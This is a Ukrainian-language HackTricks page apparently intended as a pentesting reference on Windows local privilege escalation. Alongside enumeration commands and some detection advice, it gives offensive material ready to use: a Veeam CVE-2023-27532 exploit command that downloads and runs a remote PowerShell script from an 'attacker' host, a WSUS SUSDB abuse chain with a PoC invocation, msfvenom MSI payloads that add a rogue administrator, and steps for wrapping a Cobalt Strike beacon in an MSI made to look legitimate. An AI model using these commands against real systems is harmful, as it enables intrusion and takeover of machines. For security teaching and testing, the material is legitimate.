# Локальне підвищення привілеїв у Windows

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

На цій сторінці зібрано загальну методологію підвищення привілеїв у Windows із кількох фундаментальних посібників.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Практична послідовність перерахування системи також спирається на воркшопи й контрольні списки спільноти.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Історичний матеріал про атаки містить презентацію DerbyCon про підвищення привілеїв у Windows.<sup>[[5]](#references)</sup>

## Основи Windows

### Токени доступу

**Якщо ви не знаєте, що таке токени доступу Windows, перш ніж продовжувати, прочитайте цю сторінку:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL — DACL/SACL/ACE

**Докладніше про ACL — DACL/SACL/ACE — дивіться на цій сторінці:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Рівні цілісності

**Якщо ви не знаєте, що таке рівні цілісності у Windows, перш ніж продовжувати, прочитайте цю сторінку:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Засоби захисту Windows

У Windows є різні механізми, які можуть **перешкоджати перерахуванню системи**, запуску виконуваних файлів або навіть **виявляти ваші дії**. Перш ніж починати перерахування для підвищення привілеїв, слід **прочитати** наведену нижче **сторінку** й **перевірити** всі ці **механізми захисту**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Фізичний доступ також дає змогу перетворити офлайнове редагування UEFI NVRAM на ланцюжок атак із DMA до завантаження системи та модифікацією пам’яті Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Захист адміністратора / приховане підвищення привілеїв через UIAccess

Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для отримання High IL без запитів підтвердження, якщо обійти перевірки безпечного шляху AppInfo. Описаний процес обходу UIAccess/Admin Protection наведено тут:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Поширення параметрів реєстру спеціальних можливостей Secure Desktop можна використати для довільного запису в реєстр від імені SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

У нещодавніх збірках Windows також з’явився вектор LPE через **SMB на довільному порту**, за якого привілейована локальна автентифікація NTLM відбивається через повторно використане TCP-з’єднання SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Інформація про систему

### Перерахування відомостей про версію

Перевірте, чи має версія Windows відомі вразливості (також перевірте встановлені оновлення).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Експлойти версій

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) стане в пригоді для пошуку докладної інформації про вразливості безпеки Microsoft. У цій базі даних понад 4 700 вразливостей безпеки, що демонструє **величезну поверхню атаки**, яку створює середовище Windows.

**У системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — збирає дані про збірку ОС, встановлені оновлення та можливі відповідні бюлетені безпеки; перш ніж вважати результат релевантним, перевірте точний продукт і оновлення, що замінюють попередні.

Для локального експлойта, призначеного для певної версії, перевірте **архітектуру запущеного процесу**, а також архітектуру ОС. У 64-бітній Windows для 32-бітного процесу діє [перенаправлення файлової системи WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` зазвичай вказує на 32-бітний системний каталог, тоді як `%windir%\Sysnative` дає цьому процесу доступ до нативного системного каталогу. Для 64-бітного процесу цей псевдонім недоступний. Збірка ОС або наявність кандидата на відсутнє оновлення KB не доводять, що систему можна експлуатувати; звірте поточну збірку, встановлене оновлення або оновлення, що його замінює, архітектуру процесу та передумови експлойта з [бюлетенем безпеки Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032), що стосується саме цієї проблеми.

**Локально, використовуючи інформацію про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Репозиторії експлойтів на Github:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

Чи збережені в змінних середовища облікові дані або цінна інформація?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Історія PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Файли транскриптів PowerShell

Дізнатися, як увімкнути цю функцію, можна тут: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` — лише приклад. [Політика транскрибування PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) зазвичай зберігає файли в папці Documents кожного користувача, але параметр `OutputDirectory` або `Start-Transcript -OutputDirectory` може перенаправити їх до спільної чи прихованої папки. Перш ніж переглядати транскрипт, перевірте фактичний шлях збереження та ACL файлу: він може містити аргументи команд і результати їх виконання, зокрема облікові дані. Доступний для читання транскрипт є лише зачіпкою, якщо його вміст розкриває придатну до використання особу з вищими привілеями, яка може ввійти в систему у відповідному контексті.

### Журналювання модулів PowerShell

Записуються відомості про виконання конвеєра PowerShell, зокрема виконані команди, виклики команд і частини скриптів. Однак повні відомості про виконання та результати можуть не фіксуватися.

Щоб увімкнути цю функцію, дотримуйтеся інструкцій у розділі документації "Файли транскриптів", вибравши **"Module Logging"** замість **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Щоб переглянути останні 15 подій із журналів PowersShell, можна виконати:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Фіксується повна активність і весь вміст виконання скрипту, що забезпечує документування кожного блоку коду під час його виконання. Цей процес зберігає повний аудиторський журнал кожної дії, цінний для цифрової криміналістики та аналізу шкідливої поведінки. Документування всієї активності під час виконання дає змогу отримати детальне уявлення про процес.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Журнали подій для Script Block можна знайти в засобі перегляду подій Windows за шляхом: **Журнали програм і служб > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, можна скористатися:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Налаштування Інтернету

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Диски

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP-ендпойнт WSUS — це зачіпка для перевірки можливого перехоплення метаданих оновлень. Експлуатація також залежить від того, чи використовує клієнт цей сервер WSUS, чи може зловмисник перехоплювати або контролювати його трафік, а також від політики довіри до оновлень і їх інсталяції на клієнті. Самої URL-адреси недостатньо, щоб підтвердити можливість виконання коду. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Спочатку перевірте, чи використовує мережа для оновлень WSUS без SSL, виконавши в cmd таку команду:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Або таке в PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Якщо ви отримали одну з таких відповідей:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Якщо `UseWUServer` дорівнює `1`, Windows Update використовує налаштований інтранет-сервіс. Це підтверджує одну з передумов для перехоплення HTTP-трафіку, але не доводить, що перехоплення, прийняття шкідливого оновлення або його встановлення з підвищеними привілеями можливі. Якщо значення дорівнює `0`, цей налаштований кінцевий вузол WSUS не вибирається цією політикою.

Щоб експлуатувати ці вразливості, можна скористатися такими інструментами, як [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це weaponized exploit-скрипти MiTM для ін’єкції «підроблених» оновлень у незашифрований SSL-трафік WSUS.

Ознайомтеся з дослідженням тут:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Прочитайте повний звіт тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
По суті, ця помилка експлуатує таку вразливість:

> Якщо ми можемо змінювати проксі-сервер локального користувача, а Windows Updates використовує проксі-сервер, налаштований у параметрах Internet Explorer, то ми можемо локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), щоб перехоплювати власний трафік і виконувати код із підвищеними привілеями на нашому пристрої.
>
> Крім того, оскільки служба WSUS використовує параметри поточного користувача, вона також використовує його сховище сертифікатів. Якщо створити самопідписаний сертифікат для імені вузла WSUS і додати його до сховища сертифікатів поточного користувача, ми зможемо перехоплювати трафік WSUS як HTTP, так і HTTPS. WSUS не використовує механізми на кшталт HSTS для реалізації перевірки довіри за принципом trust-on-first-use. Якщо сертифікат, якому довіряє користувач, містить правильне ім’я вузла, служба його прийме.

Цю вразливість можна експлуатувати за допомогою інструмента [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (щойно його буде опубліковано).

### Оновлення, контрольовані адміністратором WSUS

Окремий шлях існує, якщо поточна ідентичність може **публікувати та схвалювати** оновлення на сервері WSUS. Перевірте ефективне членство в групі сервера `WSUS Administrators` і будь-які делеговані дозволи WSUS, а потім визначте групу комп’ютерів-клієнтів, яка отримає схвалене оновлення. [За вимогами Microsoft, для схвалення оновлень потрібні права адміністратора WSUS](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), а [у документації описано зв’язок довіри під час публікації](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): клієнти мають довіряти сертифікату підпису, використаному для локально опублікованого вмісту. Перш ніж вважати це шляхом підвищення привілеїв, переконайтеся, що кандидатне оновлення підписане й приймається, застосовне до цільового пристрою та встановлюється в контексті з вищими привілеями. Саме лише значення HTTP `WUServer` або назва групи не підтверджує виконання цих умов.

### Зловживання спеціальними оновленнями SUSDB: непідписані payload через `.txt`/`.esd`

Це інше порушення межі довіри, ніж перехоплення HTTP-з’єднання WSUS: необхідна передумова — достатній доступ до **збережених процедур бази даних WSUS (`SUSDB`)**, щоб опублікувати та схвалити спеціальне оновлення. Один із практичних способів отримати доступ — ретрансляція облікового запису комп’ютера upstream WSUS на окремий сервер MSSQL, де розміщено `SUSDB`; точна передумова залежить від розгортання, тож спочатку перевірте дозволи `EXECUTE`, а не припускайте наявність прав адміністратора SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Окремий шлях атаки, що ретранслює автентифікацію клієнта WSUS з HTTP/8530 до LDAP, SMB або AD CS, описано в розділі [Зловживання HTTP WSUS для NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Створення, вибір цілі та схвалення оновлення

Процес роботи зі спеціальними оновленнями використовує легітимні процедури WSUS як обмежений API для публікації. Важливі такі переходи станів:<sup>[[38]](#references)</sup>

| Етап | Відповідні збережені процедури |
| --- | --- |
| Імпорт метаданих оновлення | `spImportUpdate` |
| Збереження фрагментів XML із передумовами, локалізованим та розширеним вмістом | `spSaveXMLFragment` |
| Прив’язка дайджесту вмісту до контрольованої атакувальником URL-адреси | `spSetBatchURL` |
| Перелік/створення групи комп’ютерів і додавання клієнта | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Схвалення встановлення для цієї групи | `spDeployUpdate` з `@actionID = 0` і `@isAssigned = 1` |

Ім’я файлу, дайджести, розмір і обробник `CommandLineInstallation` мають узгоджуватися в імпортованих метаданих і фрагментах. Після призначення URL-адреси вмісту та цільової групи фінальне схвалення має приблизно такий вигляд; використовуйте нові ідентифікатори оновлення, групи та розгортання, а не повторно використовуйте приклади GUID.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS зазвичай відхиляє довільний непідписаний виконуваний вміст. Однак у `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` шлях .NET `VerifyFile` встановлює прапорець перевірки сертифіката в значення false, якщо передане ім’я файлу закінчується на `.txt` або `.esd`; після цього `CheckCertificateSignature` пропускається без попередньої перевірки, чи є байти текстом або справжнім образом ESD. Тому незмінений PE-файл із назвою, наприклад, `payload.exe.txt`, може пройти перевірку вмісту, а пізніше бути запущеним обробником інсталяції оновлень через командний рядок. Це помилка політики/плутанини типів, а не підроблення підпису.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Підготовка та автоматизація, сумісні з BITS

Виклик `spDeployUpdate` змушує WSUS отримати зареєстрований вміст. Джерело має відповідати очікуванням BITS щодо HTTP: доступного URL недостатньо, оскільки передавання використовує початковий потік `HEAD`/`GET` і запити діапазонів байтів. Сервер без підтримки Range спричиняє подію синхронізації WSUS `EventId=364` із повідомленням, що BITS вимагає заголовок протоколу Range.<sup>[[39]](#references)</sup>

Дослідницький PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) генерує SQL, потрібний для ланцюжка імпорту/фрагмента/URL/групи/розгортання, містить модифікований клієнт MSSQL для його виконання та постачається з `BitsWebServer.py` для розміщення вмісту. Мінімальний запуск в авторизованій лабораторії:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Виконання без нагляду та persistence повторних спроб

Взаємодія на стороні клієнта залежить від політики. Параметр `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, опція `4 - Auto download and schedule install`, дає змогу завантажити й встановити схвалене оновлення за налаштованим розкладом без ручного вибору користувача. Під час тестування payload, оновлення якого залишалося невдалим/незавершеним, одразу пропонувалося повторно після завершення процесу callback, тому повторні спроби можуть стати persistence для повторюваного виконання; це помітно, оскільки клієнт показує стан невдалого оновлення.<sup>[[39]](#references)</sup>

#### Вектори виявлення та посилення захисту

Корисні вектори для перевірки на стороні сервера й клієнта в межах цього ланцюжка:<sup>[[39]](#references)</sup>

- Аудіюйте виконання `spCreateTargetGroup`, `spSetBatchURL` і `spDeployUpdate` у `SUSDB`; досліджуйте нові групи цільового розгортання, зовнішні джерела вмісту, payload оновлень `.txt`/`.esd` і розгортання, виконані неочікуваними суб’єктами (особливо обліковими записами, що не належать комп’ютерам).
- Перевіряйте `C:\Program Files\Update Services\LogFiles` на наявність `ContentSyncAgent`, `FileVerified`, помилково написаного `FileVerficationFailed` і `EventId=364`; зіставляйте перевірку з розширенням payload і сигнатурою вмісту, а не покладайтеся на суфікс.
- Шукайте випадки, коли встановлення Windows Update неодноразово завершується невдало/повторюється, а також виконання PE або неочікувану дочірню/мережеву активність з вмісту, що має назви `.txt` або `.esd`.
- Якщо це підтримується, вимагайте Extended Protection for Authentication для служби бази даних і обмежте мережевий доступ до бази даних сервером WSUS та авторизованими адміністративними системами. Мінімізуйте й аудіюйте права `EXECUTE` для процедур користувацьких оновлень.

## Сторонні засоби автоматичного оновлення та IPC агентів (local privesc)

Багато корпоративних агентів мають IPC-поверхню на localhost і привілейований канал оновлення. Якщо реєстрацію можна спрямувати на сервер зловмисника, а засіб оновлення довіряє підробленому кореневому CA або використовує слабку перевірку підписанта, локальний користувач може доставити шкідливий MSI, який встановить служба SYSTEM. Узагальнений опис техніки (на основі ланцюжка Netskope stAgentSvc – CVE-2025-0309) наведено тут:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM через TCP 9401)

Veeam Backup & Replication і Cloud Connect використовують основну службу резервного копіювання, яка за замовчуванням працює на **TCP/9401**. [Рекомендації Veeam](https://www.veeam.com/kb4424) описують розкриття облікових даних зашифрованої бази конфігурації без автентифікації в межах периметра мережі резервного копіювання; окремий публічний PoC демонструє шлях до виконання команд від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Служба може прослуховувати не лише localhost, тому перевірте фактичну адресу та PID.

- **Recon**: переконайтеся, що TCP/9401 належить `Veeam.Backup.Service.exe`, а потім перевірте встановлений продукт і метадані виправлень. `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` — це підказки, а не повна перевірка встановлення виправлень.
- **Мінімальні виправлені версії**: Veeam зазначає **11a build 11.0.1.1261 P20230227** і **12 build 12.0.0.1420 P20230223** як перші виправлені випуски; попередні випуски вразливі. Самої чотирикомпонентної версії файла недостатньо, щоб відрізнити невиправлену базову збірку від пізнішого виправлення для тих самих номерів збірки. Перш ніж вважати граничну збірку виправленою, звірте ідентифікатор виправлення з [історією збірок виробника](https://www.veeam.com/kb2680).
- **Exploit**: помістіть PoC на зразок `VeeamHax.exe` разом із потрібними DLL Veeam в один каталог, а потім запустіть payload рівня SYSTEM через локальний сокет:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Наведений PoC демонструє виконання команд від імені SYSTEM за наявності додаткових передумов; у рекомендаціях виробника описано проблему розкриття облікових даних.
## KrbRelayUp

Локальний Kerberos relay може перейти від входу з нижчими привілеями до запису в привілейований каталог, якщо відповідний COM-сервер автентифікується, а ретрансльований принципал має права на цільовий об’єкт. [Документація KrbRelay](https://github.com/cube0x0/KrbRelay) охоплює записи LDAP для RBCD і `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp автоматизує деякі з цих сценаріїв. Ланцюжок RBCD вимагає відповідних прав делегування та прав на цільовий об’єкт, тоді як ланцюжок shadow-credential вимагає прав на запис ключових облікових даних і KDC, що підтримує шлях автентифікації за допомогою сертифіката. Жоден із цих сценаріїв не випливає лише з членства в домені.

Перевірте фактичну політику DC щодо [підписування LDAP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) і [прив’язування каналу LDAPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL об’єкта для ретрансльованої ідентичності, а також рівні автентифікації й імперсонації вибраного класу COM. Важливі тип входу користувача та контекст облікових даних: сеанс WinRM може поводитися інакше, ніж інтерактивний вхід або вхід із новими обліковими даними. Результат також можуть змінити маршрутизація брандмауера/OXID і встановлені оновлення. Вважайте дозвільну політику або відповідний ACL приводом для перевірки; пасивне перерахування не повинно запускати примусове створення COM-запиту автентифікації, relay-автентифікацію чи записи в каталозі. Shadow credential облікового запису комп’ютера може привести до отримання квитка комп’ютера і, лише якщо цей обліковий запис має необхідні права реплікації каталогу, до окремого шляху DCSync.

Знайдіть **експлойт у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Щоб дізнатися більше про перебіг атаки, перегляньте [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Якщо** ці 2 параметри реєстру **увімкнено** (значення **0x1**), користувачі з будь-яким рівнем привілеїв можуть **інсталювати** (виконувати) файли `*.msi` від імені NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Якщо у вас є сеанс meterpreter, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі бінарний файл Windows MSI для підвищення привілеїв. Цей скрипт створює попередньо скомпільований інсталятор MSI, який пропонує додати користувача/групу (тому вам знадобиться доступ до GUI):

```
Write-UserAddMSI
```

Просто запустіть створений бінарний файл, щоб підвищити привілеї.

### Обгортка MSI

Прочитайте цей посібник, щоб дізнатися, як створити обгортку MSI за допомогою цих інструментів. Зверніть увагу: можна загорнути файл «**.bat**», якщо ви **лише** хочете **виконати** **командні рядки**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Створення MSI за допомогою WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Створення MSI за допомогою Visual Studio

- **Згенеруйте** за допомогою Cobalt Strike або Metasploit новий **Windows EXE TCP payload** у `C:\privesc\beacon.exe`
- Відкрийте **Visual Studio**, виберіть **Create a new project** і введіть «installer» у поле пошуку. Виберіть проєкт **Setup Wizard** і натисніть **Next**.
- Назвіть проєкт, наприклад **AlwaysPrivesc**, укажіть для розташування **`C:\privesc`**, виберіть **place solution and project in the same directory** і натисніть **Create**.
- Натискайте **Next**, доки не дійдете до кроку 3 із 4 (вибір файлів для додавання). Натисніть **Add** і виберіть щойно згенерований Beacon payload. Потім натисніть **Finish**.
- Виділіть проєкт **AlwaysPrivesc** у **Solution Explorer** і в розділі **Properties** змініть **TargetPlatform** з **x86** на **x64**.
  - Можна змінити й інші властивості, наприклад **Author** і **Manufacturer**, щоб установлена програма виглядала легітимнішою.
- Клацніть проєкт правою кнопкою миші й виберіть **View > Custom Actions**.
- Клацніть **Install** правою кнопкою миші й виберіть **Add Custom Action**.
- Двічі клацніть **Application Folder**, виберіть файл **beacon.exe** і натисніть **OK**. Це гарантує, що Beacon payload виконається одразу після запуску інсталятора.
- У розділі **Custom Action Properties** змініть **Run64Bit** на **True**.
- Нарешті, **зіберіть проєкт**.
  - Якщо з’явиться попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що платформу встановлено на x64.

### Інсталяція MSI

Щоб виконати **інсталяцію** шкідливого файлу `.msi` у **фоновому режимі:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Щоб експлуатувати цю вразливість, можна використати: _exploit/windows/local/always_install_elevated_

## Антивіруси та детектори

### Параметри аудиту

Ці параметри визначають, що **журналюється**, тож зверніть на них увагу.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: цікаво знати, куди надсилаються журнали

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** призначений для **керування паролями локальних адміністраторів**, гарантуючи, що на комп’ютерах, приєднаних до домену, кожен пароль **унікальний, випадковий і регулярно оновлюється**. Ці паролі надійно зберігаються в Active Directory, і доступ до них мають лише користувачі, яким через ACL надано достатні дозволи. Це дає їм змогу переглядати паролі локальних адміністраторів за наявності відповідних прав.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо WDigest активний, **паролі у відкритому текстовому вигляді зберігаються в LSASS** (Local Security Authority Subsystem Service).\
[**Більше інформації про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист Local Security Authority (LSA), щоб **блокувати** спроби недовірених процесів **читати її пам’ять** або впроваджувати код, додатково захищаючи систему.\
[**Більше інформації про LSA Protection тут**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** було представлено у **Windows 10**. Його призначення — захищати облікові дані, збережені на пристрої, від таких загроз, як атаки pass-the-hash. [**Більше інформації про Credential Guard доступно тут.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Кешовані облікові дані

**Облікові дані домену** автентифікуються **локальним органом безпеки** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим пакетом безпеки, для цього користувача зазвичай створюються облікові дані домену.\
[**Докладніше про кешовані облікові дані**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Користувачі та групи

### Перерахування користувачів і груп

Перевірте, чи мають якісь групи, до яких ви належите, цікаві дозволи.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Привілейовані групи

Якщо ви **належите до привілейованої групи, ви можете ескалювати привілеї**. Дізнайтеся більше про привілейовані групи та про те, як зловживати ними для ескалації привілеїв:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Маніпуляції токенами

**Дізнайтеся більше** про те, що таке **токен**, на цій сторінці: [**Токени Windows**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
